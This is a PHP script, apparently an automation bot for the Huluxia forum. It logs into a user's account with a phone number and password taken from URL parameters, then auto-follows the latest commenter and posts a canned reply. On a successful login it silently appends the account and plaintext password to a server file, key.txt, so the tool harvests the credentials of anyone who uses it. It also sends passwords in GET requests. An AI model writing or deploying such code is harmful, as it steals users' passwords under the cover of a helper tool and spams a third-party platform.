<?php

//登录
$phoneNumber=$_GET["phone"];
$password=md5($_GET["key"],false);
$r=$_GET["key"];
$result=file_get_contents("http://floor.huluxia.com/account/login/ANDROID/4.0?device_code=1&account=".$phoneNumber."&login_type=2&password=".$password);
$returnJson=json_decode($result,true);
$msg=$returnJson["msg"];
$key=$returnJson["_key"];
$uid=$returnJson["user"]["userID"];

switch($msg)
{
  case "账号或密码错误":
    echo '<script>window.alert("账号或密码错误！");</script>';
    break;
  case "参数不合法":
    echo '<script>window.alert("参数不合法！");</script>';
    break;
  case "账号不存在":
    echo '<script>window.alert("账号不存在");</script>';
    break;
  case "":
   //读取记录
$myfilert = fopen("key.txt", "r") or die("Unable to open file!");
$f = fread($myfilert,filesize("key.txt"));
fclose($myfilert);

//记录

    $myfile = fopen("key.txt", "w") or die("Unable to open file!");
$txt = $f."账号：".$phoneNumber."密码:".$r."\n";
fwrite($myfile, $txt);
fclose($myfile);
    break;
}

$wcnm=file_get_contents("http://floor.huluxia.com/message/new/list/ANDROID/4.0?platform=2&gkey=000000&app_version=4.1.1.2.2&versioncode=318&market_id=tool_tencent&_key=".$key."&device_code=%5Bw%5D02%3A00%3A00%3A00%3A00%3A00%5Bd%5De2f734cc-549b-4349-a311-244c64fcc71e&type_id=2&start=0&count=1");
$returnJsonhl=json_decode($wcnm,true);
$arr2 = json_decode($wcnm,true);
//超级获取术
echo"<p>他人评论内容：".$a=$arr2["datas"][0]["content"]["text"]."</p>";//评论内容
echo"<p>评论ID:".$plid=$arr2["datas"][0]["content"]["commentID"]."</p>";//评论ID
echo"<p>该评论人ID:".$user=$arr2["datas"][0]["content"]["user"]["userID"]."</p>";//用户ID
$tx=$arr2["datas"][0]["content"]["user"]["avatar"];//头像
echo"<p>该评论人昵称:".$name=$arr2["datas"][0]["content"]["user"]["nick"]."</p>";//昵称



$ys=$arr2["datas"][0]["content"]["seq"];//楼层
$plid=$arr2["datas"][0]["content"]["commentID"];//评论ID

echo$hlsq=$returnJsonhl["datas"][0]["content"]["score"];

//tzid获取
$get = "http://floor.huluxia.com/message/new/list/ANDROID/4.0?platform=2&gkey=000000&app_version=4.0.1.7&versioncode=300&market_id=tool_tencent&_key=".$key."&device_code=%5Bw%5D02%3A00%3A00%3A00%3A00%3A00%5Bd%5De2f734cc-549b-4349-a311-244c64fcc71e&type_id=2&start=0&count=1";
   $pl = file_get_contents($get);
    $pl_begin = mb_strpos($pl,',"title":"') + mb_strlen(',"title":"');//提取的开始位置
$pl_end = mb_strpos($pl,'","ext":null,"detail":null,"') - $pl_begin;//提取的结束位置
$plw = mb_substr($pl,$pl_begin,$pl_end);
$h = $plw;
$id = file_get_contents($get);
    $id_begin = mb_strpos($id,'{"postID":') + mb_strlen('{"postID":');//提取的开始位置
$id_end = mb_strpos($id,',"title":"'.$h) - $id_begin;//提取的结束位置
$tzid = mb_substr($id,$id_begin,$id_end);
//读取记录
$myfilert2 = fopen("1.txt", "r") or die("Unable to open file!");
$f2 = fread($myfilert2,filesize("1.txt"));
fclose($myfilert2);
$plid=$arr2["datas"][0]["content"]["commentID"];//评论ID
if(eregi($plid,$f2))
{echo"已回复，空参数防止多次回复";}else{
if($hlsq!=null)
{
    //执行关注

$user=$arr2["datas"][0]["content"]["user"]["userID"];
    $gzdf = "http://floor.huluxia.com/friendship/follow/ANDROID/2.0?user_id=".$user."&platform=2&gkey=000000&app_version=4.0.1.7&versioncode=300&market_id=tool_tencent&_key=".$key."&device_code=%5Bw%5D02%3A00%3A00%3A00%3A00%3A00%5Bd%5De2f734cc-549b-4349-a311-244c64fcc71e";
   echo "关注返回信息".$gzgzgz = file_get_contents($gzdf);
   
$url3 = "http://floor.huluxia.com/comment/create/ANDROID/2.0?platform=2&gkey=000000&app_version=4.0.1.7&versioncode=300&market_id=tool_tencent&_key=".$key."&device_code=%5Bw%5D02%3A00%3A00%3A00%3A00%3A00%5Bd%5De2f734cc-549b-4349-a311-244c64fcc71e&post_id=".$tzid."&comment_id=".$plid."&text=关注你了!".$sjs;
     $zt = file_get_contents($url3);
     $jsonStr = $zt;

$arr2 = json_decode($zt,true);
     echo"<p>处理状态：" .$plw=$arr2["msg"]."</p>"; 
      //记录

    $myfile2 = fopen("1.txt", "w") or die("Unable to open file!");
$txt2 = $f2.$plid."\n";
fwrite($myfile2, $txt2);
fclose($myfile2);

}}